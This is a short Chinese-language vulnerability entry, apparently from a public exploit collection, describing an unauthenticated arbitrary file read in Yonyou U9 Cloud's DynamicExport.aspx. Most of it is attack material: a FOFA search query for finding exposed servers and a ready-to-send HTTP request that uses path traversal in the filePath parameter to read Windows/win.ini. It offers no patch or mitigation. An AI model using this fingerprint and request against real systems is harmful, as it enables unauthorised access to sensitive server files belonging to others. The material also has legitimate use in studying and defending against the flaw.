## 用友U9Cloud-DynamaticExport.aspx-任意文件读取漏洞

## 一、漏洞简介
用友U9 Cloud DynamaticExport.aspx 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
(body="logo-u9.png" || body="/U9/css/")
```

## poc
```
GET /print/DynamicExport.aspx?filePath=../../../../../../Windows/win.ini HTTP/1.1
Host: [已模糊处理]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
```
